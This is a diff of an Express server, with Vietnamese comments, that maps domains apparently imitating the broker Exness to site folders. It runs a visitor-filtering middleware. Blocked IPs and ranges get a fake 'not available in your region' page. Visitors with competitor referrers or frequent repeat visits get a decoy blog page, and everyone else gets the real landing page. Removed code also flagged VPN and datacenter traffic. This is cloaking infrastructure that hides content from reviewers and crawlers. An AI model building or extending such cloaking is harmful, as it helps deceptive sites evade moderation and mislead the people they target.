@@ -1,7 +1,6 @@
-// server/index.js - THAY THẾ hàm serveIndex và blockMiddleware cũ
-
+// server/index.js
 import path from "node:path";
-import fs from 'node:fs';           // ⭐ Thêm dòng này (cho createReadStream)
+import fs from 'node:fs';
 import fsPromises from 'node:fs/promises';
 import dotenv from "dotenv";
 import express from "express";
@@ -24,14 +23,52 @@ const ADMIN_HTML = path.join(PUBLIC_DIR, "admin.html");
 
 app.disable("x-powered-by");
 app.set("trust proxy", true);
+console.log('DOMAIN_MAP from env:', process.env.DOMAIN_MAP);
+// ==================== DOMAIN MAPPING CONFIG ====================
+// Cấu hình cứng: domain nào sẽ map vào folder nào
+// Format: DOMAIN_MAP="exness-vn.com:domain1,exness-th.com:domain2,localhost:domain1"
+const DOMAIN_MAP = new Map();
 
-// Middleware xác định domain
+const domainMapConfig = process.env.DOMAIN_MAP || 'localhost:domain1';
+domainMapConfig.split(',').forEach(item => {
+  const [domain, folder] = item.split(':');
+  if (domain && folder) {
+    DOMAIN_MAP.set(domain.trim(), folder.trim());
+  }
+});
+
+// Map mặc định (fallback)
+const DEFAULT_FOLDER = process.env.DEFAULT_FOLDER || null;
+
+console.log('📍 Domain mapping:');
+DOMAIN_MAP.forEach((folder, domain) => {
+  console.log(`   ${domain} → ${folder}`);
+});
+if (DEFAULT_FOLDER) {
+  console.log(`   * (default) → ${DEFAULT_FOLDER}`);
+}
+
+// ==================== MIDDLEWARE ====================
+
+// Middleware xác định domain và map folder
 app.use((req, _res, next) => {
   console.log('\n📋 Headers received:');
   console.log(`   x-forwarded-for: ${req.headers['x-forwarded-for']}`);
   console.log(`   host: ${req.headers.host}`);
   console.log(`   user-agent: ${req.headers['user-agent']}`);
+
   req.domainHost = normalizeHost(req.headers["x-forwarded-host"] || req.headers.host || "localhost");
+
+  // Map domain → folder
+  let mappedFolder = DOMAIN_MAP.get(req.domainHost);
+  if (!mappedFolder && DEFAULT_FOLDER) {
+    mappedFolder = DEFAULT_FOLDER;
+  }
+  req.domainFolder = mappedFolder || null;
+
+  console.log(`   domainHost: ${req.domainHost}`);
+  console.log(`   mappedFolder: ${req.domainFolder || '(none - using fallback)'}`);
+
   next();
 });
 
@@ -41,11 +78,10 @@ const corsOrigin = process.env.NODE_ENV === "production"
   : "*";
 app.use(cors({ origin: corsOrigin.length ? corsOrigin : "*" }));
 
-// ==================== BLOCK MIDDLEWARE MỚI (3 cấp độ) ====================
+// ==================== BLOCK MIDDLEWARE ====================
 
 async function logSuspicious(ip, reason, detail = "") {
   console.log(`⚠️ [SUSPICIOUS] IP: ${ip} | Reason: ${reason} ${detail}`);
-  // Có thể ghi vào file log riêng
 }
 
 async function doBlock(res, config) {
@@ -59,130 +95,24 @@ async function doBlock(res, config) {
   return res.status(403).type("html").send("<h1>Access Restricted</h1><p>Not available in your region.</p>");
 }
 
-// async function blockMiddleware(req, res, config) {
-//   const ip = getClientIP(req);
-//   const { pathname } = new URL(req.url, "http://x");
-
-//   console.log(`\n🔍 ===== BLOCK MIDDLEWARE =====`);
-//   console.log(`   IP: ${ip}`);
-//   console.log(`   Path: ${pathname}`);
-//   console.log(`   Config: blockedIPs=${config?.blockedIPs?.length || 0}, blockedCIDR=${config?.blockedCIDR?.length || 0}, blockedCountries=${config?.blockedCountries?.length || 0}`);
-
-//   // Không check /api/* và /go/*
-//   if (pathname.startsWith("/api") || pathname.startsWith("/go")) {
-//     console.log(`   → Skip (API/GO route)`);
-//     return false;
-//   }
-
-//   // ===== TIER 1: HARD BLOCK =====
-//   // Static blocked IPs
-//   if ((config.blockedIPs || []).includes(ip)) {
-//     console.log(`   🔴 HARD BLOCK: IP in blocked list`);
-//     await doBlock(res, config);
-//     return 'handled';
-//   }
-
-//   // Check CIDR ranges (chỉ cho IPv4)
-//   if (config.blockedCIDR?.length && !ip.includes(':') && ip !== '::1') {
-//     const inCIDR = isIPInAnyCIDR(ip, config.blockedCIDR);
-//     console.log(`   🔍 CIDR check: ${inCIDR ? 'MATCH' : 'no match'}`);
-//     if (inCIDR) {
-//       console.log(`   🔴 HARD BLOCK: IP in CIDR range`);
-//       await doBlock(res, config);
-//       return 'handled';
-//     }
-//   }
-
-//   // ===== TIER 2: SUSPICIOUS → blog.html =====
-//   // try {
-//   //   const info = await getIPInfo(ip);
-//   //   console.log(`   📊 IP Info result:`, info);
-
-//   //   if (info) {
-//   //     // Check blocked countries
-//   //     const blockedCountries = config.blockedCountries || [];
-//   //     console.log(`   🌍 Country check: ${info.countryCode} in ${JSON.stringify(blockedCountries)}`);
-
-//   //     if (blockedCountries.includes(info.countryCode)) {
-//   //       console.log(`   🟡 SUSPICIOUS: Blocked country ${info.countryCode}`);
-//   //       await logSuspicious(ip, "blocked_country", info.countryCode);
-//   //       return 'suspicious';
-//   //     }
-
-//   //     // Check blocked ASNs (datacenter)
-//   //     if (isASNBlocked(info.as, config.blockedASNs)) {
-//   //       console.log(`   🟡 SUSPICIOUS: Blocked ASN ${info.as}`);
-//   //       await logSuspicious(ip, "blocked_asn", info.as);
-//   //       return 'suspicious';
-//   //     }
-
-//   //     // VPN / Proxy / Hosting detection
-//   //     if (info.proxy || info.hosting) {
-//   //       console.log(`   🟡 SUSPICIOUS: ${info.proxy ? 'VPN/Proxy' : 'Hosting'} detected`);
-//   //       await logSuspicious(ip, info.proxy ? "vpn_proxy" : "hosting");
-//   //       return 'suspicious';
-//   //     }
-//   //   } else {
-//   //     console.log(`   ⚠️ No IP info returned, skipping suspicious checks`);
-//   //   }
-//   // } catch (error) {
-//   //   console.error(`   ❌ IP info API error:`, error.message);
-//   // }
-
-//   // Check bad referrer 
-
-//   // Check bad referrer
-//   if (pathname === "/verify") {
-//     console.log(`   → Skip repeat visit check for /verify`);
-//     return false;
-//   }
-//   const referer = req.headers.referer || "";
-//   if (isBadReferrer(referer, config.badReferrers)) {
-//     console.log(`   🟡 SUSPICIOUS: Bad referrer ${referer}`);
-//     await logSuspicious(ip, "competitor_referrer", referer);
-//     return 'suspicious';
-//   }
-//   // if (!isLocalIP(ip)) {
-//   //   console.log("AAAAA blocked ip")
-//   //   try {
-//   //     const redis = await getRedisClient();
-//   //     const visits = await redis.incr(`visit:${ip}`);
-//   //     console.log(`   📊 Repeat visit: ${visits} for IP ${ip}`);
-
-//   //     if (visits === 1) {
-//   //       await redis.expire(`visit:${ip}`, 86400);
-//   //     }
-//   //     if (visits > 5) {
-//   //       console.log(`   🟡 SUSPICIOUS: Repeat visit ${visits}`);
-//   //       await logSuspicious(ip, "repeat_visit", `visits: ${visits}`);
-//   //       return 'suspicious';
-//   //     }
-//   //   } catch (error) {
-//   //     console.log(`   ⚠️ Repeat visit error:`, error.message);
-//   //   }
-//   // }
-
-//   console.log(`   ✅ CLEAN: Serving index.html`);
-//   return false;
-// }
+function isLocalIP(ip) {
+  return ip === '::1' || ip === '127.0.0.1' || ip === 'localhost' ||
+    ip.startsWith('192.168.') || ip.startsWith('10.');
+}
 
 async function blockMiddleware(req, res, config) {
   const ip = getClientIP(req);
   const { pathname } = new URL(req.url, "http://x");
 
-  // ===== SKIP sớm nhất có thể =====
   if (pathname.startsWith("/api") || pathname.startsWith("/go")) {
     return false;
   }
 
-  // ⭐ FIX 1: Skip tất cả static assets (có extension)
-  // CSS, JS, images, fonts... không phải "page visit"
   const hasExtension = /\.[a-zA-Z0-9]+$/.test(pathname);
   if (hasExtension) {
     return false;
   }
 
-  // ===== TIER 1: HARD BLOCK =====
   if ((config.blockedIPs || []).includes(ip)) {
     await doBlock(res, config);
     return 'handled';
@@ -195,8 +125,6 @@ async function blockMiddleware(req, res, config) {
     }
   }
 
-  // ===== TIER 2: BAD REFERRER =====
-  // ⭐ FIX 2: Skip /verify TRƯỚC khi check referrer
   if (pathname !== "/verify") {
     const referer = req.headers.referer || "";
     if (isBadReferrer(referer, config.badReferrers)) {
@@ -204,31 +132,22 @@ async function blockMiddleware(req, res, config) {
       return 'suspicious';
     }
   }
-  // if (process.env.NODE_ENV === 'development') {
-  //   console.log(`   → Skip repeat visit in development mode`);
-  //   return false;
-  // }
-  // ===== TIER 3: REPEAT VISIT =====
+
   if (!isLocalIP(ip)) {
     try {
       const redis = await getRedisClient();
-      
-      // ⭐ FIX 3: Chỉ count page visits thực sự (không có extension)
-      // Key riêng cho mỗi "page path" để tránh count chồng
       const visitKey = `visit:${ip}`;
       const visits = await redis.incr(visitKey);
-      
+
       if (visits === 1) {
         await redis.expire(visitKey, 86400);
       }
 
-      // ⭐ FIX 4: Ngưỡng cao hơn, hoặc skip /verify hoàn toàn
       if (pathname === "/verify") {
-        // /verify là landing page quan trọng, không block repeat visit
         return false;
       }
 
-      if (visits > 20) { // Tăng ngưỡng vì giờ chỉ count page visits thật
+      if (visits > 20) {
         await logSuspicious(ip, "repeat_visit", `visits: ${visits}`);
         return 'suspicious';
       }
@@ -239,12 +158,8 @@ async function blockMiddleware(req, res, config) {
 
   return false;
 }
-// Thêm hàm isLocalIP
-function isLocalIP(ip) {
-  return ip === '::1' || ip === '127.0.0.1' || ip === 'localhost' ||
-    ip.startsWith('192.168.') || ip.startsWith('10.'); // ⭐ 10.0.0.99 sẽ bị coi là local!
-}
-// ==================== SERVE PAGE MỚI (chọn index.html hoặc blog.html) ====================
+
+// ==================== SERVE PAGE ====================
 
 async function fileExists(filePath) {
   try {
@@ -258,6 +173,7 @@ async function fileExists(filePath) {
 async function servePage(req, res, domain) {
   console.log(`\n📄 ===== SERVEPAGE CALLED =====`);
   console.log(`   Domain: ${domain}`);
+  console.log(`   Mapped folder: ${req.domainFolder || '(none)'}`);
   console.log(`   URL: ${req.url}`);
 
   const config = await getDomainConfig(domain);
@@ -274,17 +190,32 @@ async function servePage(req, res, domain) {
 
   const blockResult = await blockMiddleware(req, res, config);
   console.log(`   Block result: ${blockResult}`);
-  // Nếu đã handled (hard block) → dừng
+
   if (blockResult === 'handled') return;
 
-  // Chọn file dựa vào kết quả
   const filename = (blockResult === 'suspicious') ? 'blog.html' : 'index.html';
 
-  // Ưu tiên file theo domain, sau đó fallback
-  const specificPath = path.join(PUBLIC_DIR, domain, filename);
+  // ⭐ Ưu tiên: folder đã map > folder domain > fallback
+  let specificPath = null;
+
+  if (req.domainFolder) {
+    specificPath = path.join(PUBLIC_DIR, req.domainFolder, filename);
+  }
+
+  const domainPath = path.join(PUBLIC_DIR, domain, filename);
   const fallbackPath = path.join(PUBLIC_DIR, filename);
 
-  const file = (await fileExists(specificPath)) ? specificPath : fallbackPath;
+  let file = null;
+  if (specificPath && await fileExists(specificPath)) {
+    file = specificPath;
+    console.log(`   Using mapped folder: ${req.domainFolder}/${filename}`);
+  } else if (await fileExists(domainPath)) {
+    file = domainPath;
+    console.log(`   Using domain folder: ${domain}/${filename}`);
+  } else {
+    file = fallbackPath;
+    console.log(`   Using fallback: ${filename}`);
+  }
 
   res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
 
@@ -295,18 +226,47 @@ async function servePage(req, res, domain) {
   fs.createReadStream(file).pipe(res);
 }
 
+// ==================== MULTI-DOMAIN STATIC ASSETS ====================
+
+app.use((req, res, next) => {
+  const pathname = req.path;
+  const mappedFolder = req.domainFolder;
+  const domain = req.domainHost;
+
+  const staticPrefixes = ['/assets/', '/static/', '/fonts/', '/images/', '/media/', '/locales/'];
+  const isStaticAsset = staticPrefixes.some(prefix => pathname.startsWith(prefix));
+
+  if (isStaticAsset) {
+    // Ưu tiên 1: folder đã map
+    if (mappedFolder) {
+      const mappedPath = path.join(PUBLIC_DIR, mappedFolder, pathname);
+      if (fs.existsSync(mappedPath)) {
+        console.log(`[Asset] Serving from mapped folder: ${mappedFolder}${pathname}`);
+        req.url = `/${mappedFolder}${pathname}`;
+        return next();
+      }
+    }
+
+    // Ưu tiên 2: folder theo tên domain
+    const domainPath = path.join(PUBLIC_DIR, domain, pathname);
+    if (fs.existsSync(domainPath)) {
+      console.log(`[Asset] Serving from domain folder: ${domain}${pathname}`);
+      req.url = `/${domain}${pathname}`;
+      return next();
+    }
+  }
+
+  next();
+});
+
 // ==================== ROUTES ====================
+
+// 1. API routes
 app.use("/api", createPublicApiRouter());
 app.use("/api/admin", createAdminRouter());
 app.use("/go", createRedirectRouter());
 
-// 2. Route verify - phải nằm TRƯỚC static files và catch-all
-app.get("/verify", async (req, res) => {
-  console.log(`\n🎯 VERIFY ROUTE TRIGGERED: ${req.url}`);
-  await servePage(req, res, req.domainHost);
-});
-
-// 3. Admin HTML
+// 2. Admin HTML
 app.get("/admin.html", async (_req, res) => {
   if (await fileExists(ADMIN_HTML)) {
     return res.sendFile(ADMIN_HTML);
@@ -314,29 +274,34 @@ app.get("/admin.html", async (_req, res) => {
   return res.status(404).send("admin.html not found");
 });
 
-// 4. Static files (assets, images, css, js)
-app.use(express.static(PUBLIC_DIR, { 
-  extensions: false,  // Tắt auto .html extension
-  index: false        // ⭐ Tắt auto serve index.html cho /
-}));
+// 3. Static files
+app.use(express.static(PUBLIC_DIR));
 
-// 5. Catch-all - Tất cả các route khác (bao gồm /, /abc...)
+// 4. Catch-all - serve page
 app.get("*", async (req, res) => {
-  console.log(`\n🎯 CATCH-ALL TRIGGERED: ${req.url}`);
+  if (req.path.match(/\.\w+$/)) {
+    return res.status(404).send("File not found");
+  }
   await servePage(req, res, req.domainHost);
 });
 
-// Static files (assets, images, css, js) - chỉ serve file tĩnh
+// ==================== START SERVER ====================
 
-// Khởi động server
 app.listen(PORT, async () => {
-  // Khởi tạo CIDR ranges
   const defaultConfig = await getDomainConfig('localhost');
   if (defaultConfig?.blockedCIDR) {
     initCIDRRanges(defaultConfig.blockedCIDR);
   }
 
-  console.log(`🚀 Server listening on port ${PORT}`);
+  console.log(`\n🚀 Server listening on port ${PORT}`);
   console.log(`📁 Public directory: ${PUBLIC_DIR}`);
   console.log(`🌐 Environment: ${process.env.NODE_ENV || 'development'}`);
+  console.log(`\n📌 Domain mapping rules:`);
+  DOMAIN_MAP.forEach((folder, domain) => {
+    console.log(`   ${domain} → /${folder}/`);
+  });
+  if (DEFAULT_FOLDER) {
+    console.log(`   (default) → /${DEFAULT_FOLDER}/`);
+  }
+  console.log(`   (fallback) → / (root)\n`);
 });
